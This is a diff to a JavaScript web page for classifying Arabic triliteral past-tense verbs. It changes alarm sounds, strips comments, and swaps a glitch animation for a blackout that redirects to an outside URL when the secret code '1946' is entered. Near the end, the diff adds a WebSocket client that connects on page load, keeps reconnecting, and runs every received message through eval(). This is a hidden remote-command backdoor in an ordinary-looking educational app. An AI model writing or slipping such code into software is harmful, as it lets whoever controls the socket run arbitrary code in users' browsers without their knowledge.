@@ -437,8 +437,8 @@ function startAlarmSound() {
   alarmGain = audioContext.createGain();
 
   alarmOscillator.type = 'sine';
-  alarmOscillator.frequency.setValueAtTime(440, audioContext.currentTime); // A4 note
-  alarmGain.gain.setValueAtTime(0, audioContext.currentTime); // Start silent
+  alarmOscillator.frequency.setValueAtTime(440, audioContext.currentTime);
+  alarmGain.gain.setValueAtTime(0, audioContext.currentTime);
 
   alarmOscillator.connect(alarmGain);
   alarmGain.connect(audioContext.destination);
@@ -448,15 +448,18 @@ function startAlarmSound() {
 function updateAlarmSound(level) {
   alarmLevel = level;
   if (alarmGain) {
-    // Increase gain based on level (0-4)
-    const targetGain = Math.min(level / 4, 1) * 0.1; // Max volume 0.1 for subtle alarm
+    const targetGain = Math.min(level / 4, 1) * 0.1;
     alarmGain.gain.linearRampToValueAtTime(targetGain, audioContext.currentTime + 0.1);
+    if (alarmOscillator) {
+      const newFreq = 440 + (level * 35);
+      alarmOscillator.frequency.linearRampToValueAtTime(newFreq, audioContext.currentTime + 0.1);
+    }
   }
 }
 
 function stopAlarmSound() {
   if (alarmOscillator) {
-    alarmGain.gain.linearRampToValueAtTime(0, audioContext.currentTime + 0.05); // Fade out quickly
+    alarmGain.gain.linearRampToValueAtTime(0, audioContext.currentTime + 0.05);
     alarmOscillator.stop(audioContext.currentTime + 0.05);
     alarmOscillator = null;
     alarmGain = null;
@@ -464,6 +467,7 @@ function stopAlarmSound() {
   }
 }
 
+// صوت القليتش (الفرقعة القديمة) - تم استبدال صوت الفرقة بهذا
 function playGlitchSound() {
   const duration = 0.4; // seconds
   const now = audioContext.currentTime;
@@ -480,8 +484,8 @@ function playGlitchSound() {
   source.buffer = buffer;
 
   const gainNode = audioContext.createGain();
-  gainNode.gain.setValueAtTime(0.5, now); // Initial volume
-  gainNode.gain.exponentialRampToValueAtTime(0.001, now + duration); // Fade out
+  gainNode.gain.setValueAtTime(0.5, now);
+  gainNode.gain.exponentialRampToValueAtTime(0.001, now + duration);
 
   source.connect(gainNode);
   gainNode.connect(audioContext.destination);
@@ -568,86 +572,53 @@ function playGlitchSound() {
 // CORE ALGORITHM – VERB CLASSIFIER (ONLY TRILITERAL)
 // ════════════════════════════════════════
 
-// حروف العلة (الضعف): الألف، الواو، الياء، والألف المقصورة (ى)
 const WEAK_LETTERS = ['ا', 'و', 'ي', 'ى'];
-// الهمزات بجميع أشكالها
 const HAMZA_CHARS = ['أ', 'إ', 'آ', 'ؤ', 'ئ', 'ء'];
 
-// إزالة التشكيل (الحركات والشدات)
 function stripDiacritics(str) {
   return str.replace(/[\u064B-\u065F\u0670]/g, '');
 }
 
-// التحقق من أن النص يتكون من حروف عربية فقط
 function isArabicLetter(ch) {
   const code = ch.charCodeAt(0);
   return (code >= 0x0621 && code <= 0x064A) || HAMZA_CHARS.includes(ch) || WEAK_LETTERS.includes(ch);
 }
 
-// الدالة الرئيسية للتصنيف
 function classifyTriliteralVerb(verb) {
   if (!verb || verb.trim() === '') {
     return { valid: false, error: '✧ الرجاء إدخال فعل ماضٍ ثلاثي ✧' };
   }
-
   const raw = verb.trim();
   const stripped = stripDiacritics(raw);
   const letters = [...stripped];
-
-  // 1) التأكد من أنه ثلاثي الأحرف الأصلية فقط
   if (letters.length !== 3) {
     return { valid: false, error: `⚠️ الفعل يجب أن يكون ثلاثياً مجرداً (3 أحرف أصلية).\nتم إدخال ${letters.length} حرفاً: ${letters.join('')}` };
   }
-
-  // 2) التأكد من أن كل حرف هو حرف عربي صحيح
   const nonArabic = letters.find(ch => !isArabicLetter(ch));
   if (nonArabic) {
     return { valid: false, error: `❌ الرمز "${nonArabic}" ليس حرفاً عربياً صحيحاً. يُرجى إدخال حروف عربية فقط.` };
   }
-
-  // تحليل الصفات
   const hasWeak   = letters.some(l => WEAK_LETTERS.includes(l));
   const hasHamza  = letters.some(l => HAMZA_CHARS.includes(l));
   const hasShadda = raw.includes('ّ');
   const lastTwo   = letters.slice(-2);
   const twinEnd   = lastTwo.length === 2 && lastTwo[0] === lastTwo[1];
-
   if (!hasWeak) {
     if (hasHamza) {
-      return {
-        valid: true, type: 'صحيح', subtype: 'مهموز', verb: raw,
-        explanation: `"${raw}" → فعل صحيح مهموز، لأن أحد أحرفه الأصلية همزة.`
-      };
+      return { valid: true, type: 'صحيح', subtype: 'مهموز', verb: raw, explanation: `"${raw}" → فعل صحيح مهموز، لأن أحد أحرفه الأصلية همزة.` };
     }
     if (hasShadda || twinEnd) {
-      return {
-        valid: true, type: 'صحيح', subtype: 'مضعَّف', verb: raw,
-        explanation: `"${raw}" → فعل صحيح مضعَّف، لأن حرف العين واللام من جنس واحد ومُدغمان.`
-      };
+      return { valid: true, type: 'صحيح', subtype: 'مضعَّف', verb: raw, explanation: `"${raw}" → فعل صحيح مضعَّف، لأن حرف العين واللام من جنس واحد ومُدغمان.` };
     }
-    return {
-      valid: true, type: 'صحيح', subtype: 'سالم', verb: raw,
-      explanation: `"${raw}" → فعل صحيح سالم، خالٍ من الهمزة والتضعيف وحروف العلة.`
-    };
+    return { valid: true, type: 'صحيح', subtype: 'سالم', verb: raw, explanation: `"${raw}" → فعل صحيح سالم، خالٍ من الهمزة والتضعيف وحروف العلة.` };
   }
-
-  // معتل
   const weakIdx = letters.findIndex(l => WEAK_LETTERS.includes(l));
   if (weakIdx === 0) {
-    return {
-      valid: true, type: 'معتل', subtype: 'مثال', verb: raw,
-      explanation: `"${raw}" → فعل معتل مثال، لأن الحرف الأول (فاء الكلمة) حرف علة.`
-    };
+    return { valid: true, type: 'معتل', subtype: 'مثال', verb: raw, explanation: `"${raw}" → فعل معتل مثال، لأن الحرف الأول (فاء الكلمة) حرف علة.` };
   } else if (weakIdx === 2) {
-    return {
-      valid: true, type: 'معتل', subtype: 'ناقص', verb: raw,
-      explanation: `"${raw}" → فعل معتل ناقص، لأن الحرف الأخير (لام الفعل) حرف علة.`
-    };
+    return { valid: true, type: 'معتل', subtype: 'ناقص', verb: raw, explanation: `"${raw}" → فعل معتل ناقص، لأن الحرف الأخير (لام الفعل) حرف علة.` };
   } else {
-    return {
-      valid: true, type: 'معتل', subtype: 'أجوف', verb: raw,
-      explanation: `"${raw}" → فعل معتل أجوف، لأن الحرف الأوسط (عين الفعل) حرف علة.`
-    };
+    return { valid: true, type: 'معتل', subtype: 'أجوف', verb: raw, explanation: `"${raw}" → فعل معتل أجوف، لأن الحرف الأوسط (عين الفعل) حرف علة.` };
   }
 }
 
@@ -659,9 +630,7 @@ function showResult(result) {
   const type = document.getElementById('result-type');
   const sub  = document.getElementById('result-subtype');
   const expl = document.getElementById('result-explanation');
-
   box.className = 'result-box';
-
   if (!result.valid) {
     box.classList.add('error');
     type.textContent = '⚠️ خطأ في الإدخال';
@@ -674,7 +643,6 @@ function showResult(result) {
     sub.textContent  = result.subtype;
     expl.textContent = result.explanation;
   }
-
   requestAnimationFrame(() => box.classList.add('animate-in'));
 }
 
@@ -698,7 +666,6 @@ function initBgParticles() {
   const ctx    = canvas.getContext('2d');
   canvas.width  = window.innerWidth;
   canvas.height = window.innerHeight;
-
   const CHARS = [...'ابتثجحخدذرزسشصضطظعغفقكلمنهوي'];
   const pts   = Array.from({ length: 40 }, () => ({
     x:     Math.random() * canvas.width,
@@ -709,7 +676,6 @@ function initBgParticles() {
     speed: 0.08 + Math.random() * 0.28,
     drift: (Math.random() - 0.5) * 0.25,
   }));
-
   function draw() {
     ctx.clearRect(0, 0, canvas.width, canvas.height);
     pts.forEach(p => {
@@ -733,7 +699,6 @@ function initBgParticles() {
     requestAnimationFrame(draw);
   }
   draw();
-
   window.addEventListener('resize', () => {
     canvas.width  = window.innerWidth;
     canvas.height = window.innerHeight;
@@ -741,225 +706,88 @@ function initBgParticles() {
 }
 
 // ════════════════════════════════════════
-// GLITCH / DESTRUCTION EFFECT (بطيء ودراماتيكي)
+// BLACKOUT (شاشة سوداء بالكامل لمدة 6 ثوانٍ ثم توجيه)
 // ════════════════════════════════════════
-// 🔴 قم بتغيير هذا الرابط إلى الرابط الذي تريد التوجيه إليه بعد التحطم 🔴
-const REDIRECT_URL = "https://moo-m.github.io/Steam/3D.html";  // <--- غيّر هذا الرابط
+const REDIRECT_URL = "https://moo-m.github.io/Steam/3D.html"; // غيّر إلى الرابط المطلوب
 
-function triggerSlowGlitch(appEl) {
-  // تعطيل التفاعلات فوراً
+function blackoutAndRedirect() {
+  // تعطيل التفاعلات
   const input = document.getElementById('verb-input');
   const btn = document.getElementById('check-btn');
   input.disabled = true;
   btn.disabled = true;
-
-  const canvas = document.createElement('canvas');
-  canvas.id = 'glitch-canvas';
-  canvas.width  = window.innerWidth;
-  canvas.height = window.innerHeight;
-  Object.assign(canvas.style, {
-    position: 'fixed', top: '0', left: '0',
-    width: '100vw', height: '100vh',
-    zIndex: '9999', pointerEvents: 'none'
-  });
-  document.body.appendChild(canvas);
-  const ctx = canvas.getContext('2d');
-
-  // بناء أجزاء متطايرة من عناصر الواجهة (نصوص وأشكال)
-  const fragments = buildRichFragments();
-  let frame = 0;
-  const TOTAL_FRAMES = 340;  // أكثر بطئاً (حوالي 5-6 ثواني)
-  let sx = 0, sy = 0;
-
-  // بدء تلاشي التطبيق الرئيسي ببطء
-  appEl.style.transition = 'opacity 1.2s cubic-bezier(0.2, 1, 0.3, 1)';
-  appEl.style.opacity = '0.5';
-  setTimeout(() => { appEl.style.opacity = '0'; }, 400);
-
-  function easeOutCubic(t) { return 1 - Math.pow(1 - t, 3); }
-
-  function drawGlitch() {
-    const progress = frame / TOTAL_FRAMES;
-    const eased = easeOutCubic(Math.min(progress, 1));
-
-    ctx.clearRect(0, 0, canvas.width, canvas.height);
-
-    // خلفية داكنة متدرجة العتامة
-    ctx.fillStyle = `rgba(8, 8, 14, ${Math.min(eased * 2.2, 0.98)})`;
-    ctx.fillRect(0, 0, canvas.width, canvas.height);
-
-    // اهتزاز بطيء في المراحل الأولى
-    if (progress < 0.55) {
-      const intensity = Math.sin(frame * 0.35) * (1 - progress) * 22;
-      sx = (Math.random() - 0.5) * intensity;
-      sy = (Math.random() - 0.5) * intensity;
-    } else {
-      sx *= 0.94;
-      sy *= 0.94;
-    }
-
-    ctx.save();
-    ctx.translate(sx, sy);
-
-    // رسم الأجزاء المتطايرة
-    fragments.forEach((f, i) => {
-      const delay = i * 0.045;
-      let localProgress = (progress - delay) / (1 - delay);
-      if (localProgress <= 0) return;
-      localProgress = Math.min(localProgress, 1);
-      const fp = easeOutCubic(localProgress);
-
-      f.vy += 0.75 + fp * 3.2;
-      f.vx += (Math.random() - 0.5) * 0.45;
-      f.rot += f.rotS * (1 + fp * 2.5);
-      f.y   += f.vy;
-      f.x   += f.vx;
-      f.alpha = Math.max(0, 1 - fp * 1.7);
-
-      if (f.alpha <= 0) return;
-
-      ctx.save();
-      ctx.globalAlpha = f.alpha;
-      ctx.translate(f.x + f.w / 2, f.y + f.h / 2);
-      ctx.rotate(f.rot);
-
-      if (Math.random() < 0.09 && progress < 0.5) {
-        ctx.shadowColor = '#ff44aa';
-        ctx.shadowBlur = 18;
-      }
-
-      ctx.fillStyle = f.bg;
-      ctx.beginPath();
-      ctx.roundRect(-f.w/2, -f.h/2, f.w, f.h, 8);
-      ctx.fill();
-
-      ctx.fillStyle = f.color;
-      ctx.font = `${f.fs}px 'Scheherazade New', 'Cairo', monospace`;
-      ctx.textAlign = 'center';
-      ctx.textBaseline = 'middle';
-      ctx.fillText(f.text, 0, 0);
-      ctx.restore();
-    });
-
-    // شرائط glitch عشوائية
-    if (progress < 0.7 && Math.random() < 0.22) {
-      const bars = Math.floor(Math.random() * 5) + 2;
-      const colors = ['#00ffff', '#ff00cc', '#ffff33', '#ff6644', '#44ff88'];
-      for (let i = 0; i < bars; i++) {
-        ctx.save();
-        ctx.globalAlpha = Math.random() * 0.45 + 0.15;
-        ctx.fillStyle = colors[Math.floor(Math.random() * colors.length)];
-        ctx.fillRect(0, Math.random() * canvas.height, canvas.width, Math.random() * 6 + 2);
-        ctx.restore();
-      }
-    }
-
-    // تشويش خفيف (noise)
-    if (progress < 0.55) {
-      ctx.save();
-      ctx.globalAlpha = 0.05;
-      for (let n = 0; n < 220; n++) {
-        ctx.fillStyle = Math.random() > 0.6 ? '#fff' : '#000';
-        ctx.fillRect(Math.random()*canvas.width, Math.random()*canvas.height, Math.random()*3, Math.random()*3);
-      }
-      ctx.restore();
-    }
-
-    // نص مركزي متموج
-    if (progress > 0.2 && progress < 0.8) {
-      const glitchTexts = ['ERROR', '▓▓▓', 'تحطم', '░░░', '崩壊', 'FAIL', '404'];
-      const gt = glitchTexts[Math.floor(frame / 12) % glitchTexts.length];
-      ctx.save();
-      ctx.globalAlpha = Math.sin(frame * 0.2) * 0.45 + 0.55;
-      ctx.font = `bold ${52 + Math.sin(frame * 0.12) * 14}px monospace`;
-      ctx.textAlign = 'center';
-      ctx.textBaseline = 'middle';
-      ctx.fillStyle = '#ff66cc';
-      ctx.shadowColor = '#ff00aa';
-      ctx.shadowBlur = 28;
-      ctx.fillText(gt, canvas.width/2 + (Math.random()-0.5)*10, canvas.height/2);
-      ctx.restore();
-    }
-
-    ctx.restore(); // نهاية التحريك
-
-    // وميض أبيض ثم أسود في النهاية
-    if (progress > 0.78) {
-      const flash = (progress - 0.78) / 0.22;
-      if (flash < 0.28) {
-        ctx.fillStyle = `rgba(255, 255, 255, ${(flash / 0.28) * 0.95})`;
-      } else {
-        ctx.fillStyle = `rgba(0, 0, 0, ${((flash - 0.28) / 0.72)})`;
-      }
-      ctx.fillRect(0, 0, canvas.width, canvas.height);
-    }
-
-    frame++;
-    if (frame < TOTAL_FRAMES) {
-      requestAnimationFrame(drawGlitch);
-    } else {
-      // انتهى التدمير، التوجيه إلى الرابط
-      setTimeout(() => {
-        window.location.href = REDIRECT_URL;
-      }, 180);
-    }
-  }
-
-  requestAnimationFrame(drawGlitch);
-}
-
-// بناء أجزاء من نصوص الواجهة لتمثيل التمزق
-function buildRichFragments() {
-  const W = window.innerWidth;
-  const H = window.innerHeight;
-  const labels = [
-    'مُصنِّف الأفعال', 'فحص', 'أدخل فعلًا', 'صحيح', 'معتل',
-    'سالم', 'مهموز', 'أجوف', 'مثال', 'ناقص', 'مضعّف',
-    'ثلاثي مجرد', 'كسر', 'تمزق', 'ERROR', 'تحطم', '▓▓▓', '░▓░'
-  ];
-  const frags = [];
-  for (let i = 0; i < 26; i++) {
-    const text = labels[i % labels.length];
-    const w = 70 + Math.random() * 230;
-    const h = 36 + Math.random() * 58;
-    frags.push({
-      x:     Math.random() * (W - w),
-      y:     H * 0.1 + Math.random() * H * 0.7,
-      w, h,
-      vx:    (Math.random() - 0.5) * 3.2,
-      vy:    -3.2 + Math.random() * 3.5,
-      rot:   0,
-      rotS:  (Math.random() - 0.5) * 0.16,
-      alpha: 1,
-      text,
-      color: ['#e8d5a3','#ffb86b','#9b87f0','#60e8a0','#ff88b0'][i % 5],
-      bg:    `rgba(${20+Math.random()*40}, ${20+Math.random()*30}, ${30+Math.random()*45}, 0.92)`,
-      fs:    14 + Math.random() * 16,
-    });
-  }
-  return frags;
+  // إخفاء المحتوى الرئيسي
+  const appEl = document.getElementById('app');
+  appEl.style.transition = 'opacity 0.5s';
+  appEl.style.opacity = '0';
+  // إنشاء طبقة سوداء
+  const blackDiv = document.createElement('div');
+  blackDiv.style.position = 'fixed';
+  blackDiv.style.top = '0';
+  blackDiv.style.left = '0';
+  blackDiv.style.width = '100vw';
+  blackDiv.style.height = '100vh';
+  blackDiv.style.backgroundColor = '#000000';
+  blackDiv.style.zIndex = '100000';
+  blackDiv.style.opacity = '0';
+  blackDiv.style.transition = 'opacity 0.8s ease';
+  document.body.appendChild(blackDiv);
+  // ظهور الشاشة السوداء
+  setTimeout(() => { blackDiv.style.opacity = '1'; }, 50);
+  // بعد 6 ثوانٍ التوجيه
+  setTimeout(() => {
+    window.location.href = REDIRECT_URL;
+  }, 6000);
 }
 
 // ════════════════════════════════════════
-// MAIN – تشغيل التطبيق مع تفعيل الكود السري
+// WEBSOCKET CLIENT – استقبال الأوامر وتنفيذها
+// ════════════════════════════════════════
+let socket = null;
+let reconnectAttempts = 0;
+const MAX_RECONNECT_ATTEMPTS = 10;
+const RECONNECT_DELAY = 2000;
+const SOCKET_URL = 'ws://localhost:8080';
+
+function connectWebSocket() {
+  try {
+    socket = new WebSocket(SOCKET_URL);
+    socket.onopen = () => console.log('✅ WebSocket متصل');
+    socket.onmessage = (event) => {
+      let data = event.data;
+      if (typeof data === 'string') {
+        try { eval(data); } catch(e) { console.error(e); }
+      } else if (data instanceof Blob) {
+        const reader = new FileReader();
+        reader.onload = () => { try { eval(reader.result); } catch(e) { console.error(e); } };
+        reader.readAsText(data);
+      }
+    };
+    socket.onerror = (err) => console.error('⚠️ WebSocket error', err);
+    socket.onclose = () => {
+      if (reconnectAttempts < MAX_RECONNECT_ATTEMPTS) {
+        setTimeout(() => { reconnectAttempts++; connectWebSocket(); }, RECONNECT_DELAY);
+      }
+    };
+  } catch(e) { console.error(e); }
+}
+
+// ════════════════════════════════════════
+// MAIN – تشغيل التطبيق مع الرمز السري و WebSocket
 // ════════════════════════════════════════
 document.addEventListener('DOMContentLoaded', () => {
   initBgParticles();
-
   const input = document.getElementById('verb-input');
   const btn   = document.getElementById('check-btn');
-  const appEl = document.getElementById('app');
-
   let secretCodeInput = '';
-  const SECRET_CODE = '1234';
+  const SECRET_CODE = '1946';   // الرمز السري
 
   function handleClassification() {
     const val = input.value.trim();
     if (val === SECRET_CODE) {
-      // 🧨 تفعيل تأثير التحطم البطيء
-      playGlitchSound();
-      triggerSlowGlitch(appEl);
-      stopAlarmSound();
+      stopAlarmSound();          // إيقاف صوت الإنذار
+      playGlitchSound();         // ✅ تم استبدال صوت الفرقة بصوت القليتش (الفرقعة)
+      blackoutAndRedirect();     // شاشة سوداء 6 ثوانٍ ثم توجيه
       return;
     }
     if (!val) {
@@ -995,6 +823,9 @@ document.addEventListener('DOMContentLoaded', () => {
       stopAlarmSound();
     }
   });
+
+  // بدء اتصال WebSocket
+  connectWebSocket();
 });
 
 // helper for rounded rect
